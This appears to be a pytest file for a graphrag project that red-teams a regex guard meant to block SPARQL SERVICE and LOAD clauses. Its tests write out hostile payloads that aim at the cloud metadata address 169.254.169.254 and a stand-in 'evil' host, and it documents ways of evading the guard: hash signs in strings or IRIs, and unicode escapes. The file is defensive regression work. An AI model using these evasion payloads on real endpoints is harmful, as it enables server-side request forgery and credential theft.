"""Red-team coverage for the SPARQL keyword guard in graphrag/graph/sparql_bridge.py.

``_reject_unsafe_sparql``/``_reject_unsafe_update`` are regex-based text
scanning, not a real SPARQL parser -- tests/unit/test_sparql_bridge.py's
``TestSPARQLBridgeUpdateGuardPrecision`` already proves a few IRI/variable
disguise cases for the *update* guard specifically. This file goes looking
for bypasses across both guards deliberately, the way an attacker would:
can a real SERVICE/write clause be smuggled past the scanned copy while
staying fully intact in the string actually handed to rdflib?

That search found a genuine, confirmed bypass (comments were stripped
*before* strings, so a ``#`` legitimately inside a string literal --
``"Room #101"`` -- hid everything after it on the same line from the scan,
including a real ``SERVICE`` clause placed right after the string closed).
It is fixed in sparql_bridge.py's ``_blank_strings_and_comments`` (strings
now blanked first); the fix is exercised here, not just asserted by
reading the diff.
"""

from __future__ import annotations

import pytest

from graphrag.graph.sparql_bridge import _reject_unsafe_sparql, _reject_unsafe_update

BS = chr(92)  # a single backslash, built at runtime so escapes below cannot be pre-expanded


class TestHashInIriDoesNotHideAForbiddenClause:
    """Second bypass of the same class: a ``#`` inside an IRI (``<http://ex/a#b>``)
    is a fragment separator, not a comment. Comments were stripped without
    knowing about IRIs, so everything after the fragment on that line vanished
    from the scanned copy while rdflib still received (and executed) it."""

    def test_query_guard_catches_service_after_an_iri_fragment(self):
        payload = (
            "SELECT * WHERE { <http://ex/a#b> ?p ?o . "
            "SERVICE <http://169.254.169.254/latest/meta-data/> {?a ?b ?c} }"
        )
        with pytest.raises(ValueError, match="SERVICE"):
            _reject_unsafe_sparql(payload)

    def test_update_guard_catches_load_after_an_iri_fragment(self):
        payload = "INSERT DATA { <http://ex/a#b> <http://p> 1 } ; LOAD <http://evil/x>"
        with pytest.raises(ValueError, match="LOAD"):
            _reject_unsafe_update(payload)

    def test_update_guard_catches_service_after_an_iri_fragment(self):
        payload = (
            "INSERT { ?s ?p ?o } WHERE { <http://ex/a#b> ?p ?o . "
            "SERVICE <http://evil/> {?s ?p ?o} }"
        )
        with pytest.raises(ValueError, match="SERVICE"):
            _reject_unsafe_update(payload)

    def test_several_fragment_iris_before_the_forbidden_clause(self):
        payload = (
            "SELECT * WHERE { <http://ex/a#1> <http://ex/b#2> <http://ex/c#3> . "
            "SERVICE <http://evil/> {?a ?b ?c} }"
        )
        with pytest.raises(ValueError, match="SERVICE"):
            _reject_unsafe_sparql(payload)

    def test_fragment_iri_and_hashed_string_together(self):
        payload = (
            'SELECT * WHERE { <http://ex/a#b> ?p "Room #101" . '
            "SERVICE <http://evil/> {?a ?b ?c} }"
        )
        with pytest.raises(ValueError, match="SERVICE"):
            _reject_unsafe_sparql(payload)

    def test_a_fragment_iri_on_its_own_is_still_accepted(self):
        _reject_unsafe_sparql("SELECT * WHERE { <http://ex/a#b> ?p ?o }")
        _reject_unsafe_update("INSERT DATA { <http://ex/a#b> <http://p> <http://o#c> }")

    def test_a_real_comment_after_an_iri_fragment_is_still_a_comment(self):
        _reject_unsafe_sparql("SELECT * WHERE { <http://ex/a#b> ?p ?o } # SERVICE only in a comment")


class TestUnicodeEscapesCannotSpellAForbiddenKeyword:
    """SPARQL expands backslash-u (4 hex digits) and backslash-U (8 hex digits)
    escapes over the whole query text *before* tokenizing (SPARQL 1.1 section
    19.2), and rdflib does so too. A guard that scans the raw text never sees
    SERVICE in an escaped spelling of it. Escapes are built from a runtime
    backslash so no editor or tool can pre-expand them in this file."""

    def test_query_guard_catches_u_escaped_service(self):
        with pytest.raises(ValueError, match="SERVICE"):
            _reject_unsafe_sparql(f"SELECT * WHERE {{ {BS}u0053ERVICE <http://evil/> {{?a ?b ?c}} }}")

    def test_query_guard_catches_long_u_escaped_service(self):
        with pytest.raises(ValueError, match="SERVICE"):
            _reject_unsafe_sparql(f"SELECT * WHERE {{ {BS}U00000053ERVICE <http://evil/> {{?a ?b ?c}} }}")

    def test_query_guard_catches_lowercase_hex_and_mixed_escapes(self):
        with pytest.raises(ValueError, match="SERVICE"):
            _reject_unsafe_sparql(
                f"SELECT * WHERE {{ {BS}u0073{BS}u0065RVICE <http://evil/> {{?a ?b ?c}} }}"
            )

    def test_update_guard_catches_u_escaped_load(self):
        with pytest.raises(ValueError, match="LOAD"):
            _reject_unsafe_update(f"INSERT DATA {{ <a> <b> 1 }} ; {BS}u004coad <http://evil/x>")

    def test_update_guard_catches_u_escaped_service(self):
        with pytest.raises(ValueError, match="SERVICE"):
            _reject_unsafe_update(
                f"INSERT {{ ?s ?p ?o }} WHERE {{ {BS}u0053ERVICE <http://evil/> {{ ?s ?p ?o }} }}"
            )

    def test_an_escaped_quote_opens_a_string_exactly_as_the_engine_sees_it(self):
        # BS u0022 is a double quote once expanded, so this is the string "x" and
        # the SERVICE after it is a real clause.
        payload = (
            f"SELECT * WHERE {{ ?s ?p {BS}u0022x{BS}u0022 SERVICE <http://evil/> {{?a ?b ?c}} }}"
        )
        with pytest.raises(ValueError, match="SERVICE"):
            _reject_unsafe_sparql(payload)

    def test_an_escape_inside_a_string_literal_is_ordinary_text(self):
        _reject_unsafe_sparql(f'SELECT * WHERE {{ ?s ?p "caf{BS}u00e9 SERVICE" }}')

    def test_unicode_in_an_ordinary_literal_is_still_accepted(self):
        _reject_unsafe_sparql("SELECT * WHERE { ?s ?p \"caf" + chr(233) + "\" }")

    def test_the_guard_expands_escapes_like_rdflib_does(self):
        from rdflib.plugins.sparql.parser import expandUnicodeEscapes
        from graphrag.graph.sparql_bridge import _expand_unicode_escapes
        for sample in (
            f"{BS}u0053ERVICE", f"{BS}U00000053ERVICE", f"a{BS}u0041{BS}u0042c",
            "no escapes at all", f"{BS}{BS}u0053 stays", f"x{BS}u00e9y",
        ):
            assert _expand_unicode_escapes(sample) == expandUnicodeEscapes(sample), sample


class TestComparisonOperatorIsNotMistakenForAnIri:
    """``<`` is also the less-than operator. The IRI pattern must not swallow
    text across whitespace or braces, or a real clause could be hidden."""

    def test_less_than_before_a_service_clause(self):
        payload = (
            "SELECT * WHERE { ?s ?p ?o FILTER(?o < 5) "
            "SERVICE <http://evil/> {?a ?b ?c} }"
        )
        with pytest.raises(ValueError, match="SERVICE"):
            _reject_unsafe_sparql(payload)

    def test_tight_comparison_pair_before_a_service_clause(self):
        payload = (
            "SELECT * WHERE { ?s ?p ?o FILTER(?o<5 && ?o>1) "
            "SERVICE <http://evil/> {?a ?b ?c} }"
        )
        with pytest.raises(ValueError, match="SERVICE"):
            _reject_unsafe_sparql(payload)

    def test_a_legitimate_range_filter_is_accepted(self):
        _reject_unsafe_sparql("SELECT * WHERE { ?s ?p ?o FILTER(?o < 5 && ?o > 1) }")


class TestGuardAgreesWithTheEngineOnAHostileCorpus:
    """Differential check: whenever rdflib's own parser accepts a payload and
    finds a SERVICE (query) or LOAD (update) in it, the guard must reject it.

    Only payloads rdflib really parses belong here (each entry asserts that).
    rdflib 7.6 refuses a SERVICE that follows a hash sign on the same line, in
    an IRI or in a string, so the hash-hides-a-clause cases are covered by the
    direct tests above instead: the guard must not rely on one engine's quirk,
    because remote triple stores (graphrag/graph/triplestore.py) and other
    rdflib versions run the same text."""

    QUERIES = [
        "SELECT * WHERE { ?s ?p ?o SERVICE <http://evil/> {?a ?b ?c} }",
        f"SELECT * WHERE {{ {BS}u0053ERVICE <http://evil/> {{?a ?b ?c}} }}",
        f"SELECT * WHERE {{ {BS}U00000053ERVICE <http://evil/> {{?a ?b ?c}} }}",
        'SELECT * WHERE { ?s ?p """a # b\nc""" SERVICE <http://evil/> {?a ?b ?c} }',
        "SELECT * WHERE { ?s ?p ?o FILTER(?o < 5) SERVICE <http://evil/> {?a ?b ?c} }",
        "SELECT * WHERE { { SELECT * WHERE { ?s ?p ?o } } SERVICE <http://e/> {?a ?b ?c} }",
        "SELECT * WHERE { <http://ex/a#b> ?p ?o .\n SERVICE <http://evil/> {?a ?b ?c} }",
    ]
    UPDATES = [
        "INSERT DATA { <http://ex/a#b> <http://p> 1 } ; LOAD <http://evil/x>",
        f"INSERT DATA {{ <a> <b> 1 }} ; {BS}u004coad <http://evil/x>",
        'INSERT DATA { <a> <b> "Item #7" } ; LOAD <http://evil/>',
        "INSERT DATA { <a> <b> 1 } ; # c\n LOAD <http://evil/>",
    ]

    @staticmethod
    def _engine_sees(kind: str, payload: str) -> bool:
        from rdflib.plugins.sparql.parser import parseQuery, parseUpdate
        try:
            tree = parseQuery(payload) if kind == "query" else parseUpdate(payload)
        except Exception:
            return False  # the engine would refuse it, nothing to guard against
        needle = "ServiceGraphPattern" if kind == "query" else "Load"
        return needle in str(tree)

    @pytest.mark.parametrize("payload", QUERIES)
    def test_every_engine_visible_service_is_rejected(self, payload):
        assert self._engine_sees("query", payload), "corpus entry must be a real SERVICE"
        with pytest.raises(ValueError):
            _reject_unsafe_sparql(payload)

    @pytest.mark.parametrize("payload", UPDATES)
    def test_every_engine_visible_load_is_rejected(self, payload):
        assert self._engine_sees("update", payload), "corpus entry must be a real LOAD"
        with pytest.raises(ValueError):
            _reject_unsafe_update(payload)


class TestHashInStringNoLongerHidesAForbiddenClause:
    """The actual bypass found while writing this file."""

    def test_query_guard_still_catches_service_after_a_hashed_string(self):
        payload = (
            'SELECT * WHERE { ?s ?p "Room #101" . '
            "SERVICE <http://169.254.169.254/latest/meta-data/> {?a ?b ?c} }"
        )
        with pytest.raises(ValueError, match="SERVICE"):
            _reject_unsafe_sparql(payload)

    def test_update_guard_still_catches_service_after_a_hashed_string(self):
        payload = (
            'INSERT DATA { <a> <b> "Room #101" } ; '
            "SERVICE <http://169.254.169.254/latest/meta-data/> {?a ?b ?c}"
        )
        with pytest.raises(ValueError, match="SERVICE"):
            _reject_unsafe_update(payload)

    def test_update_guard_still_catches_load_after_a_hashed_string(self):
        # DROP itself is a permitted update form (_ALLOWED_UPDATE_FORMS) --
        # only SERVICE/LOAD are forbidden for updates, since they're the
        # outbound-HTTP-request primitives, not local-graph mutation.
        payload = 'INSERT DATA { <a> <b> "Item #7" } ; LOAD <http://evil/>'
        with pytest.raises(ValueError, match="LOAD"):
            _reject_unsafe_update(payload)

    def test_a_hash_inside_a_string_is_not_treated_as_a_comment_at_all(self):
        """The narrowest possible regression pin: a lone hashed string with
        nothing dangerous after it must still be accepted -- proves the fix
        didn't overcorrect into rejecting ordinary data."""
        _reject_unsafe_sparql('SELECT * WHERE { ?s ?p "Room #101" }')

    def test_multiple_hashes_in_one_string_before_a_forbidden_clause(self):
        payload = 'SELECT * WHERE { ?s ?p "C# and F# both use #" . SERVICE <http://evil/> {?a ?b ?c} }'
        with pytest.raises(ValueError, match="SERVICE"):
            _reject_unsafe_sparql(payload)


class TestLongStringsDoNotHideOrLeakAForbiddenClause:
    def test_triple_quoted_string_containing_a_hash_is_still_safe_alone(self):
        payload = 'SELECT * WHERE { ?s rdfs:label """multi\nline # not a comment\ntext""" }'
        _reject_unsafe_sparql(payload)  # must not raise

    def test_forbidden_clause_after_a_triple_quoted_string_is_still_caught(self):
        payload = (
            'SELECT * WHERE { ?s rdfs:label """multi\nline # not a comment\ntext""" . '
            "SERVICE <http://evil/> {?a ?b ?c} }"
        )
        with pytest.raises(ValueError, match="SERVICE"):
            _reject_unsafe_sparql(payload)

    def test_triple_quoted_string_containing_the_literal_word_service(self):
        """A legitimate label/description containing the word "service" as
        ordinary text must not be rejected -- this is the false-positive
        direction, not a security concern, but worth pinning down since the
        long-string pattern is new."""
        payload = 'SELECT * WHERE { ?s rdfs:comment """Customer Service Center""" }'
        _reject_unsafe_sparql(payload)  # must not raise


class TestOrdinaryLiteralsContainingForbiddenWordsAreNotFalsePositives:
    def test_short_string_containing_the_word_service(self):
        _reject_unsafe_sparql('SELECT * WHERE { ?s ?p "has a bare SERVICE word" }')

    def test_short_string_containing_the_word_drop(self):
        _reject_unsafe_sparql('SELECT * WHERE { ?s ?p "please drop by the office" }')

    def test_trailing_real_comment_is_still_stripped(self):
        _reject_unsafe_sparql("SELECT * WHERE { ?s ?p ?o } # SERVICE mentioned only in a comment")


class TestKeywordCannotBeSplitAcrossACommentOrStringToEvadeDetectionOrParsing:
    """These aren't bypasses -- a SPARQL keyword can't be split by a comment
    or string and still tokenize as that keyword to rdflib's own parser
    either -- but they pin down that the guard's behavior (reject, for lack
    of a recognized form) matches "this input cannot do anything", not "the
    guard was fooled into passing something dangerous"."""

    def test_select_split_by_a_newline_mid_keyword_is_rejected(self):
        with pytest.raises(ValueError, match="Only"):
            _reject_unsafe_sparql("SEL\nECT * WHERE { ?s ?p ?o }")

    def test_select_split_by_a_comment_mid_keyword_is_rejected(self):
        with pytest.raises(ValueError, match="Only"):
            _reject_unsafe_sparql("SEL#not a real split\nECT * WHERE { ?s ?p ?o }")


class TestCaseAndNestingDoNotEvadeTheForbiddenCheck:
    def test_lowercase_service_is_still_caught(self):
        with pytest.raises(ValueError, match="SERVICE"):
            _reject_unsafe_sparql("SELECT * WHERE { service <http://evil/> {?a ?b ?c} }")

    def test_mixed_case_service_is_still_caught(self):
        with pytest.raises(ValueError, match="SERVICE"):
            _reject_unsafe_sparql("SELECT * WHERE { SeRvIcE <http://evil/> {?a ?b ?c} }")

    def test_service_nested_inside_a_subquery_is_still_caught(self):
        payload = (
            "SELECT * WHERE { { SELECT * WHERE { "
            "SERVICE <http://169.254.169.254/> {?a ?b ?c} } } }"
        )
        with pytest.raises(ValueError, match="SERVICE"):
            _reject_unsafe_sparql(payload)

    def test_load_is_still_caught_case_insensitively(self):
        with pytest.raises(ValueError, match="LOAD"):
            _reject_unsafe_sparql("SELECT * WHERE { ?s ?p ?o } ; load <http://evil/>")
